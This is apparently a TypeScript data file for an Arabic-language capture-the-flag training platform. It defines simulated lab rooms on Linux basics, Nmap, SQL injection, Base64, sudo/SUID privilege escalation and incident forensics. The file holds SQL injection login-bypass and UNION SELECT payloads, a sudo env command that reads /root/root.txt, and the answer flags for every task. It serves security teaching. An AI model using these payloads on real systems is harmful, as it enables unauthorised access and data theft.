import type { LearningPath, Room } from '../types/platform';

export const ROOMS: Room[] = [
  {
    id: 'linux-essentials',
    slug: 'linux-essentials',
    titleAr: 'أساسيات سطر أوامر لينكس واستكشاف الملفات',
    subtitleAr: 'تعلم التنقل في نظام الملفات، كشف الملفات المخفية، والبحث داخل السجلات',
    descriptionAr:
      'تُعد بيئة لينكس حجر الأساس لأي مختبر اختراق أو محلل أمني. في هذه الغرفة ستتقن استخدام أوامر الاستكشاف الأساسية لقراءة ملفات النظام والعثور على بيانات مخفية داخل مجلد المستخدم.',
    difficulty: 'beginner',
    category: 'linux',
    estimatedMinutes: 20,
    totalXp: 150,
    targetIp: '10.10.14.22',
    tools: ['ls', 'cat', 'grep', 'pwd'],
    terminal: {
      hostname: 'nawat-ubuntu',
      username: 'analyst',
      targetIp: '10.10.14.22',
      cwd: '/home/analyst',
      files: {
        'readme.txt':
          'مرحباً بك في بيئة التدريب.\nابحث عن الملفات المخفية باستخدام الخيار المناسب لأمر ls.\nflag_part_1=FLAG{LINUX_BASICS_710}',
        '.hidden_secret':
          '# Secret Configuration\nAPI_ENV=staging\nACCESS_FLAG=FLAG{HIDDEN_DOTFILE_409}',
        'auth.log': [
          'Nov 18 09:12:01 server sshd[1024]: Accepted publickey for admin from 192.168.1.10',
          'Nov 18 09:14:22 server sshd[1055]: Failed password for root from 185.220.101.4',
          'Nov 18 09:14:25 server sshd[1055]: Failed password for root from 185.220.101.4',
          'Nov 18 09:15:09 server sshd[1088]: TOKEN_AUDIT=FLAG{GREP_LOG_HUNTER_882}',
          'Nov 18 09:18:44 server systemd[1]: Started Session 42 of user analyst.',
        ].join('\n'),
      },
      customCommands: {},
    },
    tasks: [
      {
        id: 'linux-t1',
        stepNumber: 1,
        titleAr: 'استعراض الملفات وقراءة المحتوى',
        explanationAr: [
          'عند دخولك إلى أي نظام لينكس عبر الطرفية (Terminal)، أول خطوة هي معرفة موقعك الحالي واستعراض الملفات المتاحة في المجلد.',
          'نستخدم الأمر ls لعرض الملفات، والأمر cat لطباعة محتوى أي ملف نصي مباشرة على الشاشة.',
        ],
        snippets: [
          {
            id: 'lin-s1',
            label: 'استعراض الملفات وقراءة readme.txt',
            language: 'bash',
            code: 'pwd\nls\ncat readme.txt',
          },
        ],
        questionAr: 'ما هو العلم (Flag) الموجود داخل الملف readme.txt؟',
        hintAr: 'نفّذ الأمر cat readme.txt في الطرفية الجانبية لقراءة النص.',
        flag: 'FLAG{LINUX_BASICS_710}',
        flagFormat: 'FLAG{...}',
        xp: 50,
      },
      {
        id: 'linux-t2',
        stepNumber: 2,
        titleAr: 'اكتشاف الملفات المخفية',
        explanationAr: [
          'في أنظمة لينكس، أي ملف يبدأ اسمه بنقطة (.) يُعتبر ملفاً مخفياً ولا يظهر عند تشغيل الأمر ls العادي.',
          'لإظهار جميع الملفات بما فيها المخفية مع تفاصيل الصلاحيات والحجم، نضيف الخيار -la.',
        ],
        snippets: [
          {
            id: 'lin-s2',
            label: 'عرض الملفات المخفية وقراءتها',
            language: 'bash',
            code: 'ls -la\ncat .hidden_secret',
          },
        ],
        questionAr: 'استخرج قيمة ACCESS_FLAG من الملف المخفي.',
        hintAr: 'استخدم ls -la لرؤية اسم الملف الذي يبدأ بنقطة ثم اقرأه بـ cat.',
        flag: 'FLAG{HIDDEN_DOTFILE_409}',
        flagFormat: 'FLAG{...}',
        xp: 50,
      },
      {
        id: 'linux-t3',
        stepNumber: 3,
        titleAr: 'تصفية السجلات باستخدام grep',
        explanationAr: [
          'عند فحص ملفات السجلات الضخمة مثل auth.log، يصعب قراءة كل سطر يدوياً. نستخدم أداة grep للبحث عن كلمات مفتاحية محددة.',
          'حاول البحث عن كلمة TOKEN_AUDIT أو FLAG داخل ملف السجلات.',
        ],
        snippets: [
          {
            id: 'lin-s3',
            label: 'البحث داخل ملف السجلات',
            language: 'bash',
            code: 'grep FLAG auth.log',
          },
        ],
        questionAr: 'ما هي قيمة العلم الموجود داخل سطر TOKEN_AUDIT في ملف auth.log؟',
        hintAr: 'نفّذ الأمر grep TOKEN_AUDIT auth.log للوصول للسطر مباشرة.',
        flag: 'FLAG{GREP_LOG_HUNTER_882}',
        flagFormat: 'FLAG{...}',
        xp: 50,
      },
    ],
  },
  {
    id: 'nmap-network-recon',
    slug: 'nmap-network-recon',
    titleAr: 'فحص الشبكات واكتشاف المنافذ عبر Nmap',
    subtitleAr: 'تحديد الخدمات المفتوحة وإصداراتها على الخادم المستهدف باستخدام Nmap',
    descriptionAr:
      'قبل محاولة اختبار أي خادم، يجب جمع المعلومات الدقيقة حول المنافذ المفتوحة والخدمات العاملة عليه. ستتدرب هنا على أهم خيارات Nmap لاكتشاف البصمة البرمجية للخدمات.',
    difficulty: 'beginner',
    category: 'network',
    estimatedMinutes: 25,
    totalXp: 200,
    targetIp: '10.10.24.15',
    tools: ['nmap', 'curl', 'netcat'],
    terminal: {
      hostname: 'kali-recon',
      username: 'pentester',
      targetIp: '10.10.24.15',
      cwd: '/home/pentester',
      files: {
        'targets.txt': '10.10.24.15\n# Scope: internal web & ssh lab',
      },
      customCommands: {
        'nmap 10.10.24.15': [
          'Starting Nmap 7.95 ( https://nmap.org )',
          'Nmap scan report for 10.10.24.15',
          'Host is up (0.018s latency).',
          'Not shown: 997 closed tcp ports (conn-refused)',
          'PORT     STATE SERVICE',
          '22/tcp   open  ssh',
          '80/tcp   open  http',
          '8080/tcp open  http-proxy',
          '',
          'Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds',
        ].join('\n'),
        'nmap -sV 10.10.24.15': [
          'Starting Nmap 7.95 ( https://nmap.org )',
          'Nmap scan report for 10.10.24.15',
          'Host is up (0.016s latency).',
          'PORT     STATE SERVICE    VERSION',
          '22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu',
          '80/tcp   open  http       nginx 1.24.0',
          '8080/tcp open  http-proxy Jetty 11.0.15 (FLAG{NMAP_SERVICE_PORT_8080})',
          '',
          'Service detection performed. Nmap done: 1 IP address scanned in 6.14 seconds',
        ].join('\n'),
        'nmap -sV -sC 10.10.24.15': [
          'Starting Nmap 7.95 ( https://nmap.org )',
          'Nmap scan report for 10.10.24.15',
          'PORT     STATE SERVICE    VERSION',
          '22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu',
          '80/tcp   open  http       nginx 1.24.0',
          '|_http-title: Nawat Internal Portal',
          '8080/tcp open  http-proxy Jetty 11.0.15 (FLAG{NMAP_SERVICE_PORT_8080})',
          '|_http-robots.txt: 1 disallowed entry (/backup-key)',
        ].join('\n'),
        'curl http://10.10.24.15:8080/robots.txt':
          'User-agent: *\nDisallow: /backup-key\n# Note: check /backup-key endpoint',
        'curl http://10.10.24.15:8080/backup-key':
          '{"status":"exposed","audit_flag":"FLAG{ROBOTS_ENDPOINT_319}"}',
      },
    },
    tasks: [
      {
        id: 'nmap-t1',
        stepNumber: 1,
        titleAr: 'اكتشاف المنافذ والإصدارات العاملة',
        explanationAr: [
          'الفحص الأساسي باستخدام nmap يخبرك فقط باسم الخدمة الافتراضية، لكنه لا يكشف رقم الإصدار الفعلي للبرنامج.',
          'لإجبار Nmap على قراءة البصمة البرمجية (Banner Grabbing) وتحديد الإصدارات الدقيقة، نمرر الخيار -sV مع عنوان الهدف.',
        ],
        snippets: [
          {
            id: 'nmap-s1',
            label: 'فحص الإصدارات باستخدام Nmap',
            language: 'bash',
            code: 'nmap -sV 10.10.24.15',
          },
        ],
        questionAr: 'ما هو العلم الذي ظهر بجانب خدمة المنفذ 8080 أثناء فحص -sV؟',
        hintAr: 'شغّل الأمر nmap -sV 10.10.24.15 داخل الطرفية.',
        flag: 'FLAG{NMAP_SERVICE_PORT_8080}',
        flagFormat: 'FLAG{...}',
        xp: 100,
      },
      {
        id: 'nmap-t2',
        stepNumber: 2,
        titleAr: 'تشغيل السكربتات الافتراضية واستكشاف الويب',
        explanationAr: [
          'يتضمن Nmap محرك سكربتات NSE. الخيار -sC يشغّل مجموعة الفحوصات الآمنة الافتراضية مثل قراءة عنوان الصفحة أو ملف robots.txt.',
          'بعد اكتشاف المسار المخفي عبر -sC، يمكنك استدعاؤه مباشرة بأداة curl.',
        ],
        snippets: [
          {
            id: 'nmap-s2',
            label: 'تشغيل السكربتات ثم فحص المسار المكتشف',
            language: 'bash',
            code: 'nmap -sV -sC 10.10.24.15\ncurl http://10.10.24.15:8080/backup-key',
          },
        ],
        questionAr: 'ما هو العلم الموجود داخل استجابة المسار /backup-key؟',
        hintAr: 'استخدم curl http://10.10.24.15:8080/backup-key بعد رؤية مخرجات -sC.',
        flag: 'FLAG{ROBOTS_ENDPOINT_319}',
        flagFormat: 'FLAG{...}',
        xp: 100,
      },
    ],
  },
  {
    id: 'web-sqli-auth',
    slug: 'web-sqli-auth',
    titleAr: 'ثغرة حقن SQL وتجاوز المصادقة',
    subtitleAr: 'فهم آلية استغلال استعلامات قواعد البيانات غير المحمية عبر curl و SQL',
    descriptionAr:
      'تحدث ثغرة حقن SQL عندما يُدمج إدخال المستخدم مباشرة داخل استعلام قاعدة البيانات دون تعقيم أو استخدام Prepared Statements. ستتعلم كيف يتغير منطق الاستعلام لتجاوز شاشة تسجيل الدخول.',
    difficulty: 'intermediate',
    category: 'web',
    estimatedMinutes: 30,
    totalXp: 250,
    targetIp: '10.10.55.90',
    tools: ['curl', 'sqlmap', 'http'],
    terminal: {
      hostname: 'web-auditor',
      username: 'researcher',
      targetIp: '10.10.55.90',
      cwd: '/home/researcher',
      files: {
        'vulnerable_login.php': [
          '$user = $_POST["username"];',
          '$pass = $_POST["password"];',
          '$query = "SELECT * FROM users WHERE username = \'$user\' AND password = \'$pass\'";',
          '// No prepared statements used!',
        ].join('\n'),
      },
      customCommands: {
        "curl -X POST http://10.10.55.90/login -d \"username=admin' OR '1'='1&password=x\"": [
          'HTTP/1.1 200 OK',
          'Content-Type: application/json',
          '{"authenticated":true,"role":"administrator","session_flag":"FLAG{SQLI_AUTH_BYPASS_504}"}',
        ].join('\n'),
        "curl http://10.10.55.90/users?id=1 UNION SELECT 1,username,secret_flag FROM secrets": [
          'HTTP/1.1 200 OK',
          '[{"id":1,"username":"admin","secret_flag":"FLAG{UNION_SELECT_EXTRACT_911}"}]',
        ].join('\n'),
      },
    },
    tasks: [
      {
        id: 'sqli-t1',
        stepNumber: 1,
        titleAr: 'تحليل الكود المصدري وتجاوز تسجيل الدخول',
        explanationAr: [
          'ابدأ بقراءة الملف vulnerable_login.php لفهم كيفية بناء الاستعلام البرمجي.',
          'عند تمرير حمولة منطقية مثل \' OR \'1\'=\'1 في حقل اسم المستخدم، يصبح الشرط دائماً صحيحاً (True) ويعيد قاعدة البيانات أول سجل غالباً ما يكون حساب المدير.',
        ],
        snippets: [
          {
            id: 'sqli-s1',
            label: 'مراجعة الكود ثم إرسال طلب التجاوز',
            language: 'bash',
            code: "cat vulnerable_login.php\ncurl -X POST http://10.10.55.90/login -d \"username=admin' OR '1'='1&password=x\"",
          },
        ],
        questionAr: 'ما هو العلم (session_flag) الناتج عن تجاوز شاشة المصادقة؟',
        hintAr: 'انسخ أمر curl الموضح في الخطوة وشغّله في الطرفية.',
        flag: 'FLAG{SQLI_AUTH_BYPASS_504}',
        flagFormat: 'FLAG{...}',
        xp: 120,
      },
      {
        id: 'sqli-t2',
        stepNumber: 2,
        titleAr: 'استخراج البيانات عبر UNION SELECT',
        explanationAr: [
          'بعد إثبات وجود الثغرة، يمكن لمختبر الاختراق دمج نتائج جدول آخر باستخدام المعامل UNION SELECT بشرط تطابق عدد الأعمدة.',
          'في هذا التطبيق المكشوف، يحتوي الجدول secrets على عمود secret_flag.',
        ],
        snippets: [
          {
            id: 'sqli-s2',
            label: 'استخراج السجلات من جدول secrets',
            language: 'bash',
            code: 'curl http://10.10.55.90/users?id=1 UNION SELECT 1,username,secret_flag FROM secrets',
          },
        ],
        questionAr: 'استخرج العلم المخزن داخل جدول secrets.',
        hintAr: 'نفّذ أمر curl مع UNION SELECT في الطرفية للحصول على بيانات JSON.',
        flag: 'FLAG{UNION_SELECT_EXTRACT_911}',
        flagFormat: 'FLAG{...}',
        xp: 130,
      },
    ],
  },
  {
    id: 'crypto-encoding-lab',
    slug: 'crypto-encoding-lab',
    titleAr: 'تحليل الترميز وفك تشفير الرسائل',
    subtitleAr: 'التمييز بين الترميز (Encoding) والتشفير وفك سلاسل Base64 و Hex',
    descriptionAr:
      'كثيراً ما تُخفى البيانات الحساسة داخل نصوص مرمزة بصيغ مثل Base64 أو Hex في سجلات الشبكة أو الكود المصدري. تعلم كيفية فحص النصوص واستعادة أصلها عبر سطر الأوامر.',
    difficulty: 'beginner',
    category: 'crypto',
    estimatedMinutes: 15,
    totalXp: 140,
    targetIp: '10.10.88.12',
    tools: ['base64', 'echo', 'cat'],
    terminal: {
      hostname: 'crypto-lab',
      username: 'decoder',
      targetIp: '10.10.88.12',
      cwd: '/home/decoder',
      files: {
        'intercepted.b64': 'RkxBR3tCQVNFNjRfREVDT0RFUl8xNDd9',
        'notes.txt':
          'Encrypted token payload captured from header:\nX-Audit-Token: RkxBR3tIRUFERVJfVE9LRU5fNjIwfQ==',
      },
      customCommands: {
        'cat intercepted.b64 | base64 -d': 'FLAG{BASE64_DECODER_147}',
      },
    },
    tasks: [
      {
        id: 'crypto-t1',
        stepNumber: 1,
        titleAr: 'فك ترميز ملف Base64',
        explanationAr: [
          'تُستخدم خوارزمية Base64 لتحويل البيانات الثنائية إلى نص مقروء يسهل نقله عبر بروتوكولات الويب، وهي ليست تشفيراً آمناً لأن أي شخص يمكنه عكسها.',
          'اقرأ محتوى intercepted.b64 ثم فك ترميزه باستخدام الأداة base64 -d.',
        ],
        snippets: [
          {
            id: 'crypto-s1',
            label: 'قراءة النص المرمز وفكه',
            language: 'bash',
            code: 'cat intercepted.b64\nbase64 -d RkxBR3tCQVNFNjRfREVDT0RFUl8xNDd9',
          },
        ],
        questionAr: 'ما هي القيمة الأصلية بعد فك ترميز الملف intercepted.b64؟',
        hintAr: 'استخدم base64 -d متبوعاً بالنص الموجود داخل الملف.',
        flag: 'FLAG{BASE64_DECODER_147}',
        flagFormat: 'FLAG{...}',
        xp: 70,
      },
      {
        id: 'crypto-t2',
        stepNumber: 2,
        titleAr: 'استخراج وفك ترويسة المصادقة',
        explanationAr: [
          'داخل ملف notes.txt يوجد ترويسة HTTP تحتوي على قيمة مرمزة تنتهي بعلامتي == وهو مؤشر كلاسيكي على Base64.',
          'قم بفك ترميز القيمة باستخدام echo والأنبوب | أو عبر base64 -d مباشرة.',
        ],
        snippets: [
          {
            id: 'crypto-s2',
            label: 'فك ترميز قيمة X-Audit-Token',
            language: 'bash',
            code: 'cat notes.txt\necho RkxBR3tIRUFERVJfVE9LRU5fNjIwfQ== | base64 -d',
          },
        ],
        questionAr: 'ما هو العلم المستخرج من قيمة X-Audit-Token؟',
        hintAr: 'اقرأ notes.txt ثم مرّر القيمة المرمزة إلى base64 -d.',
        flag: 'FLAG{HEADER_TOKEN_620}',
        flagFormat: 'FLAG{...}',
        xp: 70,
      },
    ],
  },
  {
    id: 'linux-privesc-sudo',
    slug: 'linux-privesc-sudo',
    titleAr: 'تصعيد الصلاحيات في لينكس عبر Sudo و SUID',
    subtitleAr: 'تحليل إعدادات sudoers والثغرات الشائعة للوصول إلى صلاحيات الجذر root',
    descriptionAr:
      'الحصول على صدفة دخول أولية (Initial Foothold) هو نصف الطريق فقط. في هذه الغرفة المتوسطة ستتعلم كيفية فحص صلاحيات sudo للمستخدم الحالي واستغلال الأذونات الخاطئة لقراءة ملف الجذر.',
    difficulty: 'intermediate',
    category: 'linux',
    estimatedMinutes: 35,
    totalXp: 300,
    targetIp: '10.10.77.40',
    tools: ['sudo', 'find', 'cat'],
    terminal: {
      hostname: 'target-srv01',
      username: 'www-data',
      targetIp: '10.10.77.40',
      cwd: '/var/www',
      files: {
        'app.conf': 'DB_HOST=127.0.0.1\nAPP_MODE=production',
      },
      customCommands: {
        'sudo -l': [
          'Matching Defaults entries for www-data on target-srv01:',
          '    env_reset, mail_badpass',
          '',
          'User www-data may run the following commands on target-srv01:',
          '    (root) NOPASSWD: /usr/bin/less /var/log/syslog',
          '    (root) NOPASSWD: /usr/bin/env',
        ].join('\n'),
        'find / -perm -4000 2>/dev/null': [
          '/usr/bin/passwd',
          '/usr/bin/sudo',
          '/usr/local/bin/backup-tool  # [SUID Misconfiguration]',
        ].join('\n'),
        'sudo /usr/bin/env /bin/sh -p -c "cat /root/root.txt"':
          'FLAG{SUDO_ENV_ROOT_774}',
        '/usr/local/bin/backup-tool --status':
          'Backup daemon running as UID=0 (root)\nAudit Flag: FLAG{SUID_BINARY_ROOT_309}',
      },
    },
    tasks: [
      {
        id: 'privesc-t1',
        stepNumber: 1,
        titleAr: 'فحص صلاحيات sudo الممنوحة للمستخدم',
        explanationAr: [
          'عند الحصول على جلسة كمستخدم محدود الصلاحيات مثل www-data، أول أمر يجب تجربته هو sudo -l لمعرفة البرامج التي يُسمح لك بتشغيلها بصلاحية root دون كلمة مرور.',
          'ستلاحظ إمكانية تشغيل /usr/bin/env بصلاحية الجذر، وهو ما يسمح بتنفيذ أوامر أخرى بصلاحية root (راجع تقنيات GTFOBins).',
        ],
        snippets: [
          {
            id: 'priv-s1',
            label: 'فحص الصلاحيات واستغلال env',
            language: 'bash',
            code: 'sudo -l\nsudo /usr/bin/env /bin/sh -p -c "cat /root/root.txt"',
          },
        ],
        questionAr: 'ما هو العلم الموجود داخل ملف /root/root.txt؟',
        hintAr: 'افحص الصلاحيات أولاً بـ sudo -l ثم نفذ أمر استغلال env.',
        flag: 'FLAG{SUDO_ENV_ROOT_774}',
        flagFormat: 'FLAG{...}',
        xp: 150,
      },
      {
        id: 'privesc-t2',
        stepNumber: 2,
        titleAr: 'البحث عن ملفات SUID القابلة للاستغلال',
        explanationAr: [
          'بت (SUID) يعني أن البرنامج يُنفذ بصلاحيات مالكه (غالباً root) بغض النظر عن المستخدم الذي شغّله.',
          'نبحث عن هذه الملفات باستخدام الأمر find مع القناع -perm -4000.',
        ],
        snippets: [
          {
            id: 'priv-s2',
            label: 'اكتشاف ملفات SUID',
            language: 'bash',
            code: 'find / -perm -4000 2>/dev/null\n/usr/local/bin/backup-tool --status',
          },
        ],
        questionAr: 'ما هو العلم الظاهر عند تشغيل الأداة غير المحمية backup-tool؟',
        hintAr: 'شغّل الأمر find / -perm -4000 2>/dev/null لاكتشاف المسار ثم نفذ --status.',
        flag: 'FLAG{SUID_BINARY_ROOT_309}',
        flagFormat: 'FLAG{...}',
        xp: 150,
      },
    ],
  },
  {
    id: 'forensics-incident-log',
    slug: 'forensics-incident-log',
    titleAr: 'التحقيق الجنائي في حوادث الاختراق واستخراج الحمولة',
    subtitleAr: 'تحليل سجلات الخادم وكشف عناوين IP المهاجمة والمسار المخترق',
    descriptionAr:
      'كمحلل استجابة للحوادث (SOC / DFIR)، مهمتك إعادة بناء خط زمني للهجوم من خلال سجلات الوصول، تحديد الثغرة المستغلة، واستخلاص مؤشرات الاختراق بدقة.',
    difficulty: 'advanced',
    category: 'forensics',
    estimatedMinutes: 40,
    totalXp: 350,
    targetIp: '10.10.99.5',
    tools: ['grep', 'strings', 'cat'],
    terminal: {
      hostname: 'dfir-workstation',
      username: 'soc-lead',
      targetIp: '10.10.99.5',
      cwd: '/cases/incident-42',
      files: {
        'access.log': [
          '192.168.10.4 - - [18/Nov/2026:03:11:02] "GET /index.html HTTP/1.1" 200 1420',
          '45.133.1.99 - - [18/Nov/2026:03:14:19] "GET /wp-login.php HTTP/1.1" 404 512',
          '45.133.1.99 - - [18/Nov/2026:03:15:40] "POST /api/upload?cmd=whoami HTTP/1.1" 200 98',
          '45.133.1.99 - - [18/Nov/2026:03:16:05] "GET /uploads/shell.php?trace=FLAG{DFIR_ACCESS_LOG_641} HTTP/1.1" 200 204',
        ].join('\n'),
        'suspicious.bin':
          'ELF_HEADER_BYTES...\nINIT_SOCKET=45.133.1.99:4444\nC2_BEACON=FLAG{MALWARE_STRINGS_908}\nEXIT_CODE=0',
      },
      customCommands: {},
    },
    tasks: [
      {
        id: 'dfir-t1',
        stepNumber: 1,
        titleAr: 'تتبع طلبات المهاجم في access.log',
        explanationAr: [
          'يحتوي ملف access.log على سجل طلبات HTTP الواردة للخادم. لاحظ محاولة المسح الأولية التي أعادت 404 ثم نجاح رفع ملف تنفيذي (Web Shell).',
          'ابحث عن طلبات shell.php أو الرمز 200 المرتبط بعنوان المهاجم.',
        ],
        snippets: [
          {
            id: 'dfir-s1',
            label: 'تصفية السجل لكشف نقطة الاختراق',
            language: 'bash',
            code: 'grep shell.php access.log',
          },
        ],
        questionAr: 'ما هو العلم الموثق في رابط الوصول إلى shell.php؟',
        hintAr: 'استخدم grep shell.php access.log لعزل السطر الحرج.',
        flag: 'FLAG{DFIR_ACCESS_LOG_641}',
        flagFormat: 'FLAG{...}',
        xp: 175,
      },
      {
        id: 'dfir-t2',
        stepNumber: 2,
        titleAr: 'تحليل النصوص القابلة للقراءة في الملف التنفيذي',
        explanationAr: [
          'عند العثور على ملف ثنائي مشبوه suspicious.bin، نستخدم أداة strings لاستخراج جميع السلاسل النصية المقروءة داخله دون تشغيله، لاكتشاف عناوين التحكم (C2).',
        ],
        snippets: [
          {
            id: 'dfir-s2',
            label: 'استخراج المؤشرات من الملف الثنائي',
            language: 'bash',
            code: 'strings suspicious.bin',
          },
        ],
        questionAr: 'ما هو العلم الموجود في قيمة C2_BEACON؟',
        hintAr: 'نفّذ الأمر strings suspicious.bin داخل الطرفية.',
        flag: 'FLAG{MALWARE_STRINGS_908}',
        flagFormat: 'FLAG{...}',
        xp: 175,
      },
    ],
  },
];

export const LEARNING_PATHS: LearningPath[] = [
  {
    id: 'path-red-foundations',
    titleAr: 'مسار أساسيات الاختبار الاختراقي',
    descriptionAr:
      'ابدأ من الصفر ببناء مهاراتك في نظام لينكس وفحص الشبكات واكتشاف الخدمات المفتوحة.',
    levelAr: 'مبتدئ',
    roomIds: ['linux-essentials', 'nmap-network-recon', 'crypto-encoding-lab'],
  },
  {
    id: 'path-web-privesc',
    titleAr: 'مسار استغلال الويب وتصعيد الصلاحيات',
    descriptionAr:
      'انتقل إلى استغلال ثغرات قواعد البيانات وتصعيد صلاحيات الخوادم حتى الوصول للجذر.',
    levelAr: 'متوسط',
    roomIds: ['web-sqli-auth', 'linux-privesc-sudo'],
  },
  {
    id: 'path-soc-dfir',
    titleAr: 'مسار الاستجابة للحوادث والتحليل الجنائي',
    descriptionAr:
      'تتبع آثار الهجمات داخل السجلات وفحص الملفات المشبوهة لاستخلاص مؤشرات الاختراق.',
    levelAr: 'متقدم',
    roomIds: ['forensics-incident-log'],
  },
];
